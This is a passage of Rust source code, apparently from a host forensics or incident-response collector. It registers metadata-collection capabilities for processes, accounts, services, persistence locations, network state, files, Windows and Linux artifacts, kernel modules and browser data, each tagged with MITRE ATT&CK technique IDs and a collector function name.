                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "collect_process_modules",
                true,
            ),
            Capability::new(
                "process.module.path",
                "Module Paths",
                "Capture module path metadata for loaded libraries.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "collect_process_modules",
                true,
            ),
            Capability::new(
                "process.module.version",
                "Module Versions",
                "Collect library version metadata for modules.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "collect_process_modules",
                true,
            ),
            Capability::new(
                "process.module.signature",
                "Module Signatures",
                "Capture signing state when available for libraries.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "collect_process_modules",
                true,
            ),
            Capability::new(
                "process.parent.name",
                "Parent Name",
                "Resolve parent process names for ancestry analysis.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "collect_process_tree",
                true,
            ),
            Capability::new(
                "process.child.pids",
                "Child PIDs",
                "Resolve child process identifiers for process tree extraction.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "collect_process_tree",
                true,
            ),
            Capability::new(
                "process.tree",
                "Process Tree",
                "Construct a parent-child process tree and ancestry model.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "collect_process_tree",
                true,
            ),
            Capability::new(
                "process.memory.map",
                "Memory Regions",
                "Enumerate memory mappings and executable memory regions.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1055"],
                "enumerate_memory_regions",
                true,
            ),
            Capability::new(
                "process.deleted.exe",
                "Deleted Executable",
                "Detect deleted-on-disk executables still mapped or running.",
                CapabilityCategory::Process,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1036"],
                "detect_deleted_executables",
                true,
            ),
            Capability::new(
                "process.open.files",
                "Open Files",
                "Collect file handle metadata and open file paths for each process.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.network.connections",
                "Process Network",
                "Associate network connections with the owning process.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1049"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.hash",
                "Executable Hash",
                "Collect the SHA-256 hash of a process executable when available.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1027"],
                "enumerate_processes",
                true,
            ),
            Capability::new(
                "process.integrity",
                "Integrity Level",
                "Capture process integrity metadata when exposed by the platform.",
                CapabilityCategory::Process,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1057"],
                "enumerate_processes",
                true,
            ),
        ];
        self.register_named_capabilities(&entries);
    }

    fn register_user_and_auth_capabilities(&mut self) {
        let entries = [
            Capability::new(
                "user.list",
                "User List",
                "Enumerate local account inventory and base metadata.",
                CapabilityCategory::User,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1087"],
                "enumerate_users",
                true,
            ),
            Capability::new(
                "user.sid",
                "User IDs",
                "Capture user IDs, SIDs, and account identity metadata.",
                CapabilityCategory::User,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1087"],
                "enumerate_users",
                true,
            ),
            Capability::new(
                "user.home",
                "Home Directories",
                "Enumerate user home directory metadata.",
                CapabilityCategory::User,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1087"],
                "enumerate_users",
                true,
            ),
            Capability::new(
                "user.shell",
                "User Shell",
                "Collect login shell configuration for each account.",
                CapabilityCategory::User,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1087"],
                "enumerate_users",
                true,
            ),
            Capability::new(
                "user.group.membership",
                "Group Membership",
                "Collect group memberships for each user.",
                CapabilityCategory::User,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1087"],
                "enumerate_users",
                true,
            ),
            Capability::new(
                "user.last.login",
                "Last Login",
                "Collect last login metadata when available.",
                CapabilityCategory::User,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1087"],
                "enumerate_users",
                true,
            ),
            Capability::new(
                "user.status",
                "Account Status",
                "Collect account disabled, locked, and status flags.",
                CapabilityCategory::User,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1087"],
                "enumerate_users",
                true,
            ),
            Capability::new(
                "user.admin",
                "Privileged Users",
                "Identify administrator or elevated accounts.",
                CapabilityCategory::User,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1078"],
                "enumerate_users",
                true,
            ),
            Capability::new(
                "user.service.accounts",
                "Service Accounts",
                "Enumerate service and non-human accounts.",
                CapabilityCategory::User,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1078"],
                "enumerate_users",
                true,
            ),
            Capability::new(
                "auth.logon.events",
                "Logon Events",
                "Collect authentication events with metadata and timestamps.",
                CapabilityCategory::Authentication,
                Platform::Both,
                PrivilegeLevel::Admin,
                &["T1110"],
                "collect_logon_events",
                true,
            ),
            Capability::new(
                "auth.successful.logins",
                "Successful Logins",
                "Capture successful sign-in records.",
                CapabilityCategory::Authentication,
                Platform::Both,
                PrivilegeLevel::Admin,
                &["T1110"],
                "collect_logon_events",
                true,
            ),
            Capability::new(
                "auth.failed.logins",
                "Failed Logins",
                "Collect failed sign-in activity and lockout evidence.",
                CapabilityCategory::Authentication,
                Platform::Both,
                PrivilegeLevel::Admin,
                &["T1110"],
                "collect_logon_events",
                true,
            ),
            Capability::new(
                "auth.remote.sessions",
                "Remote Sessions",
                "Inventory remote access sessions when available.",
                CapabilityCategory::Authentication,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1021"],
                "collect_logon_events",
                true,
            ),
            Capability::new(
                "auth.ssh.config",
                "SSH Configuration",
                "Collect SSH configuration and host metadata.",
                CapabilityCategory::Authentication,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1552"],
                "collect_auth_policy",
                true,
            ),
            Capability::new(
                "auth.ssh.authorized.keys",
                "Authorized Keys",
                "Collect SSH authorized key metadata without exposing secrets.",
                CapabilityCategory::Authentication,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1552"],
                "collect_auth_policy",
                true,
            ),
            Capability::new(
                "auth.ssh.known.hosts",
                "Known Hosts",
                "Collect SSH known-host metadata.",
                CapabilityCategory::Authentication,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1552"],
                "collect_auth_policy",
                true,
            ),
            Capability::new(
                "auth.password.policy",
                "Password Policy",
                "Collect local password and account policy metadata.",
                CapabilityCategory::Authentication,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1204"],
                "collect_auth_policy",
                true,
            ),
            Capability::new(
                "auth.sudoers",
                "Sudoers",
                "Collect sudoers configuration and delegation metadata.",
                CapabilityCategory::Authentication,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1548"],
                "collect_auth_policy",
                true,
            ),
            Capability::new(
                "auth.pam",
                "PAM Configuration",
                "Read PAM configuration metadata for authentication flows.",
                CapabilityCategory::Authentication,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1556"],
                "collect_auth_policy",
                true,
            ),
            Capability::new(
                "auth.windows.logon",
                "Windows Logons",
                "Collect Windows logon metadata via native event sources.",
                CapabilityCategory::Authentication,
                Platform::Windows,
                PrivilegeLevel::Admin,
                &["T1110"],
                "collect_windows_logon_events",
                true,
            ),
        ];
        self.register_named_capabilities(&entries);
    }

    fn register_service_and_persistence_capabilities(&mut self) {
        let entries = [
            Capability::new(
                "service.list",
                "Service Inventory",
                "Enumerate installed services and runtime state.",
                CapabilityCategory::Service,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1543"],
                "enumerate_services",
                true,
            ),
            Capability::new(
                "service.name",
                "Service Name",
                "Collect the service name and display name metadata.",
                CapabilityCategory::Service,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1543"],
                "enumerate_services",
                true,
            ),
            Capability::new(
                "service.state",
                "Service State",
                "Collect the current start state of each service.",
                CapabilityCategory::Service,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1543"],
                "enumerate_services",
                true,
            ),
            Capability::new(
                "service.binary.path",
                "Service Binary",
                "Capture the executable path used by each service.",
                CapabilityCategory::Service,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1543"],
                "enumerate_services",
                true,
            ),
            Capability::new(
                "service.account",
                "Service Account",
                "Collect the account used to run each service.",
                CapabilityCategory::Service,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1543"],
                "enumerate_services",
                true,
            ),
            Capability::new(
                "service.dependencies",
                "Service Dependencies",
                "Collect dependent service chains and startup order.",
                CapabilityCategory::Service,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1543"],
                "enumerate_services",
                true,
            ),
            Capability::new(
                "service.start.mode",
                "Service Start Mode",
                "Collect start-mode classifications and service triggers.",
                CapabilityCategory::Service,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1543"],
                "enumerate_services",
                true,
            ),
            Capability::new(
                "service.driver.list",
                "Driver Inventory",
                "Enumerate kernel drivers and installed driver metadata.",
                CapabilityCategory::Service,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "enumerate_drivers",
                true,
            ),
            Capability::new(
                "service.systemd.units",
                "Systemd Units",
                "Enumerate systemd unit inventory and metadata.",
                CapabilityCategory::Service,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1543"],
                "enumerate_systemd_units",
                true,
            ),
            Capability::new(
                "persistence.run",
                "Run Keys",
                "Collect Run and RunOnce registry persistence locations.",
                CapabilityCategory::Persistence,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1547"],
                "collect_autostart_entries",
                true,
            ),
            Capability::new(
                "persistence.startup.folder",
                "Startup Folder",
                "Enumerate startup directory persistence entries.",
                CapabilityCategory::Persistence,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1547"],
                "collect_autostart_entries",
                true,
            ),
            Capability::new(
                "persistence.scheduled.task",
                "Scheduled Tasks",
                "Enumerate scheduled tasks and task actions.",
                CapabilityCategory::Persistence,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1053"],
                "collect_autostart_entries",
                true,
            ),
            Capability::new(
                "persistence.cron",
                "Cron Entries",
                "Enumerate cron and crontab persistence artifacts.",
                CapabilityCategory::Persistence,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1053"],
                "collect_autostart_entries",
                true,
            ),
            Capability::new(
                "persistence.systemd.timer",
                "Systemd Timers",
                "Enumerate systemd timer persistence entries.",
                CapabilityCategory::Persistence,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1053"],
                "collect_autostart_entries",
                true,
            ),
            Capability::new(
                "persistence.shell.profile",
                "Shell Profiles",
                "Collect shell profile and login script persistence metadata.",
                CapabilityCategory::Persistence,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1547"],
                "collect_autostart_entries",
                true,
            ),
            Capability::new(
                "persistence.wmi",
                "WMI Persistence",
                "Collect WMI persistence subscriptions when present.",
                CapabilityCategory::Persistence,
                Platform::Windows,
                PrivilegeLevel::Admin,
                &["T1546"],
                "collect_autostart_entries",
                true,
            ),
            Capability::new(
                "persistence.ssh",
                "SSH Persistence",
                "Collect SSH configuration and key-based persistence metadata.",
                CapabilityCategory::Persistence,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1098"],
                "collect_autostart_entries",
                true,
            ),
            Capability::new(
                "persistence.winlogon",
                "Winlogon",
                "Collect Winlogon startup configuration metadata.",
                CapabilityCategory::Persistence,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1547"],
                "collect_autostart_entries",
                true,
            ),
            Capability::new(
                "persistence.ifeo",
                "IFEO",
                "Collect Image File Execution Options persistence metadata.",
                CapabilityCategory::Persistence,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1546"],
                "collect_autostart_entries",
                true,
            ),
            Capability::new(
                "persistence.appinit",
                "AppInit",
                "Collect AppInit DLL persistence metadata.",
                CapabilityCategory::Persistence,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1546"],
                "collect_autostart_entries",
                true,
            ),
        ];
        self.register_named_capabilities(&entries);
    }

    fn register_network_capabilities(&mut self) {
        let entries = [
            Capability::new(
                "network.interfaces",
                "Interface Inventory",
                "Collect network interfaces and basic metadata.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1016"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.interface.addresses",
                "Interface Addresses",
                "Collect IPv4 and IPv6 addresses for active interfaces.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1016"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.mac",
                "MAC Addresses",
                "Collect interface MAC addresses and driver metadata.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1016"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.routes",
                "Route Table",
                "Collect IPv4 and IPv6 routes and gateway metadata.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1016"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.arp",
                "ARP Table",
                "Collect neighbor cache metadata and link-layer mappings.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1016"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.dns.servers",
                "DNS Servers",
                "Collect configured DNS server settings.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1016"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.dns.cache",
                "DNS Cache",
                "Collect cached DNS entries when available on the host.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1016"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.hosts",
                "Hosts File",
                "Collect hosts file entries and custom name resolution metadata.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1016"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.connections.active",
                "Active Connections",
                "Enumerate active TCP and UDP connections.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1049"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.listening.ports",
                "Listening Ports",
                "Enumerate local listening sockets and bound addresses.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1049"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.tcp",
                "TCP Connections",
                "Collect TCP state, endpoints, and process ownership metadata.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1049"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.udp",
                "UDP Connections",
                "Collect UDP sockets and endpoint metadata.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1049"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.process.relationships",
                "Process Relationships",
                "Map socket ownership to associated processes.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1049"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.proxy",
                "Proxy Configuration",
                "Collect proxy configuration metadata.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1016"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.vpn",
                "VPN Metadata",
                "Collect VPN configuration and tunnel metadata when available.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1016"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.firewall.policy",
                "Firewall Policy",
                "Collect firewall configuration and rule metadata.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::Admin,
                &["T1562"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.shares",
                "Network Shares",
                "Collect SMB or remote share metadata.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1021"],
                "enumerate_connections",
                true,
            ),
            Capability::new(
                "network.listeners",
                "Suspicious Listeners",
                "Identify unexpected listening services and unusual binds.",
                CapabilityCategory::Network,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1049"],
                "enumerate_connections",
                true,
            ),
        ];
        self.register_named_capabilities(&entries);
    }

    fn register_filesystem_capabilities(&mut self) {
        let entries = [
            Capability::new(
                "filesystem.enumerate",
                "Filesystem Enumeration",
                "Enumerate discovered files and directories.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.path",
                "File Paths",
                "Collect file and directory paths for forensic review.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.size",
                "File Sizes",
                "Collect file size metadata for suspicious or large artifacts.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.timestamps",
                "File Timestamps",
                "Collect creation, modification, and access timestamps.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.permissions",
                "Permissions",
                "Collect permission bits and ownership metadata.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.owner",
                "Ownership",
                "Collect user and group ownership metadata.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.type",
                "File Type",
                "Identify file and directory types for triage.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.hidden",
                "Hidden Files",
                "Capture hidden and dot-prefixed entries.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.links",
                "Symlinks",
                "Enumerate symlinks and link targets.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.executable",
                "Executable Detection",
                "Flag executable and script file entries.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1036"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.hash.sha256",
                "SHA-256 Hashes",
                "Compute SHA-256 hashes for files and evidence items.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1027"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.hash.sha1",
                "SHA-1 Hashes",
                "Compute legacy SHA-1 hashes where required for correlation.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1027"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.hash.md5",
                "MD5 Hashes",
                "Compute MD5 values for legacy sample matching and triage.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1027"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.recent",
                "Recent Files",
                "Collect recently modified and created artifacts.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.mounts",
                "Mount Metadata",
                "Collect filesystem mount metadata and labels.",
                CapabilityCategory::Filesystem,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_mounts",
                true,
            ),
            Capability::new(
                "filesystem.alternate.data.streams",
                "ADS Metadata",
                "Identify alternate data streams on supported filesystems.",
                CapabilityCategory::Filesystem,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1564"],
                "enumerate_files",
                true,
            ),
            Capability::new(
                "filesystem.deleted.open",
                "Deleted-But-Open Files",
                "Identify file handles to deleted content when exposed by the OS.",
                CapabilityCategory::Filesystem,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1083"],
                "enumerate_files",
                true,
            ),
        ];
        self.register_named_capabilities(&entries);
    }

    fn register_windows_artifact_capabilities(&mut self) {
        let entries = [
            Capability::new(
                "artifact.prefetch",
                "Prefetch Inventory",
                "Collect Prefetch metadata for executable execution history.",
                CapabilityCategory::WindowsArtifact,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1057"],
                "carve_prefetch",
                true,
            ),
            Capability::new(
                "artifact.lnk",
                "LNK Inventory",
                "Collect LNK shortcut metadata and target path details.",
                CapabilityCategory::WindowsArtifact,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1057"],
                "carve_lnk_files",
                true,
            ),
            Capability::new(
                "artifact.recycle.bin",
                "Recycle Bin Inventory",
                "Collect Recycle Bin metadata for deleted file evidence.",
                CapabilityCategory::WindowsArtifact,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1070"],
                "carve_recycle_bin",
                true,
            ),
            Capability::new(
                "artifact.shellbags",
                "Shellbags",
                "Collect Shellbag metadata for folder access history.",
                CapabilityCategory::WindowsArtifact,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1083"],
                "carve_shellbags",
                true,
            ),
            Capability::new(
                "artifact.jump.lists",
                "Jump Lists",
                "Collect Jump List metadata for recent file usage history.",
                CapabilityCategory::WindowsArtifact,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1057"],
                "carve_jumplists",
                true,
            ),
            Capability::new(
                "artifact.amcache",
                "Amcache Inventory",
                "Collect Amcache execution metadata and file hashes.",
                CapabilityCategory::WindowsArtifact,
                Platform::Windows,
                PrivilegeLevel::Admin,
                &["T1057"],
                "carve_amcache",
                true,
            ),
            Capability::new(
                "artifact.srum",
                "SRUM Inventory",
                "Collect SRUM application and resource usage records.",
                CapabilityCategory::WindowsArtifact,
                Platform::Windows,
                PrivilegeLevel::Admin,
                &["T1057"],
                "carve_srum",
                true,
            ),
            Capability::new(
                "artifact.etw",
                "ETW Inventory",
                "Collect ETW-oriented telemetry metadata when available.",
                CapabilityCategory::WindowsArtifact,
                Platform::Windows,
                PrivilegeLevel::Admin,
                &["T1562"],
                "collect_etw_logs",
                true,
            ),
            Capability::new(
                "artifact.event.logs",
                "Event Logs",
                "Collect Windows event log metadata for authentication and process activity.",
                CapabilityCategory::WindowsArtifact,
                Platform::Windows,
                PrivilegeLevel::Admin,
                &["T1562"],
                "carve_prefetch",
                true,
            ),
            Capability::new(
                "artifact.recent.files",
                "Recent Files",
                "Collect recent document metadata from Windows user artifacts.",
                CapabilityCategory::WindowsArtifact,
                Platform::Windows,
                PrivilegeLevel::User,
                &["T1070"],
                "carve_lnk_files",
                true,
            ),
        ];
        self.register_named_capabilities(&entries);
    }

    fn register_linux_artifact_capabilities(&mut self) {
        let entries = [
            Capability::new(
                "artifact.shell.history",
                "Shell History",
                "Collect shell history data and commands from user profiles.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1552"],
                "carve_shell_history",
                true,
            ),
            Capability::new(
                "artifact.cron",
                "Cron Artifacts",
                "Collect system and user cron entries and schedules.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1053"],
                "carve_cron_entries",
                true,
            ),
            Capability::new(
                "artifact.systemd",
                "Systemd Units",
                "Collect systemd unit definitions and service metadata.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1543"],
                "carve_systemd_units",
                true,
            ),
            Capability::new(
                "artifact.ssh",
                "SSH Artifacts",
                "Collect SSH config, known_hosts, and related metadata.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1552"],
                "carve_ssh_config",
                true,
            ),
            Capability::new(
                "artifact.auth.logs",
                "Auth Logs",
                "Collect authentication and authorization log inventory.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1110"],
                "collect_logs",
                true,
            ),
            Capability::new(
                "artifact.journal",
                "Journal Inventory",
                "Collect journald metadata and log source inventory.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1562"],
                "collect_logs",
                true,
            ),
            Capability::new(
                "artifact.auditd",
                "Auditd Inventory",
                "Collect auditd configuration and log source inventory.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1562"],
                "collect_logs",
                true,
            ),
            Capability::new(
                "artifact.sudo",
                "Sudo Logs",
                "Collect sudo authority and command logging metadata.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1548"],
                "collect_logs",
                true,
            ),
            Capability::new(
                "artifact.bash.history",
                "Bash History",
                "Collect shell command history for current users.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1552"],
                "carve_shell_history",
                true,
            ),
            Capability::new(
                "artifact.zsh.history",
                "Zsh History",
                "Collect zsh command history when present.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1552"],
                "carve_shell_history",
                true,
            ),
            Capability::new(
                "artifact.login.config",
                "Login Configuration",
                "Collect login policy and login shell configuration metadata.",
                CapabilityCategory::LinuxArtifact,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1078"],
                "collect_logs",
                true,
            ),
        ];
        self.register_named_capabilities(&entries);
    }

    fn register_driver_security_capabilities(&mut self) {
        let entries = [
            Capability::new(
                "kernel.modules",
                "Kernel Modules",
                "Enumerate loaded kernel modules and metadata.",
                CapabilityCategory::KernelDriver,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "enumerate_modules",
                true,
            ),
            Capability::new(
                "kernel.module.paths",
                "Module Paths",
                "Capture kernel module file paths and dependencies.",
                CapabilityCategory::KernelDriver,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "enumerate_modules",
                true,
            ),
            Capability::new(
                "kernel.module.params",
                "Module Parameters",
                "Collect module parameters and configuration values.",
                CapabilityCategory::KernelDriver,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "enumerate_modules",
                true,
            ),
            Capability::new(
                "kernel.module.version",
                "Module Versions",
                "Collect loaded module version information.",
                CapabilityCategory::KernelDriver,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "enumerate_modules",
                true,
            ),
            Capability::new(
                "kernel.module.signatures",
                "Module Signatures",
                "Collect signature state when available from the platform.",
                CapabilityCategory::KernelDriver,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "enumerate_modules",
                true,
            ),
            Capability::new(
                "kernel.module.hashes",
                "Kernel Hashes",
                "Capture module file hashes for integrity review.",
                CapabilityCategory::KernelDriver,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1014"],
                "enumerate_modules",
                true,
            ),
            Capability::new(
                "security.audit.policy",
                "Audit Policy",
                "Collect audit policy metadata and log configuration.",
                CapabilityCategory::SecurityConfig,
                Platform::Both,
                PrivilegeLevel::Admin,
                &["T1562"],
                "collect_audit_policy",
                true,
            ),
            Capability::new(
                "security.antivirus",
                "AV Inventory",
                "Inventory security products and signatures when available.",
                CapabilityCategory::SecurityConfig,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1562"],
                "detect_av_edr",
                true,
            ),
            Capability::new(
                "security.firewall",
                "Firewall State",
                "Collect local firewall configuration and rule state.",
                CapabilityCategory::SecurityConfig,
                Platform::Both,
                PrivilegeLevel::Admin,
                &["T1562"],
                "collect_firewall_rules",
                true,
            ),
            Capability::new(
                "security.selinux",
                "SELinux State",
                "Collect SELinux enforcement metadata when available.",
                CapabilityCategory::SecurityConfig,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1562"],
                "collect_app_control",
                true,
            ),
            Capability::new(
                "security.apparmor",
                "AppArmor State",
                "Collect AppArmor policy metadata when available.",
                CapabilityCategory::SecurityConfig,
                Platform::Linux,
                PrivilegeLevel::User,
                &["T1562"],
                "collect_app_control",
                true,
            ),
            Capability::new(
                "security.policy",
                "Security Policy",
                "Collect application control and local policy metadata.",
                CapabilityCategory::SecurityConfig,
                Platform::Both,
                PrivilegeLevel::Admin,
                &["T1562"],
                "collect_app_control",
                true,
            ),
            Capability::new(
                "security.update.state",
                "Update State",
                "Collect general update and patch status metadata.",
                CapabilityCategory::SecurityConfig,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1562"],
                "detect_av_edr",
                true,
            ),
        ];
        self.register_named_capabilities(&entries);
    }

    fn register_application_and_malware_capabilities(&mut self) {
        let entries = [
            Capability::new(
                "app.browser.inventory",
                "Browser Inventory",
                "Collect browser installation and profile inventory metadata.",
                CapabilityCategory::ApplicationArtifact,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1555"],
                "carve_browser_artifacts",
                true,
            ),
            Capability::new(
                "app.browser.extensions",
                "Browser Extensions",
                "Collect browser extension metadata without exposing secrets.",
                CapabilityCategory::ApplicationArtifact,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1555"],
                "carve_browser_artifacts",
                true,
            ),
            Capability::new(
                "app.browser.history",
                "Browser History",
                "Collect browser history metadata and recent URL access indicators.",
                CapabilityCategory::ApplicationArtifact,
                Platform::Both,
                PrivilegeLevel::User,
                &["T1555"],
                "carve_browser_artifacts",
                true,
            ),
            Capability::new(
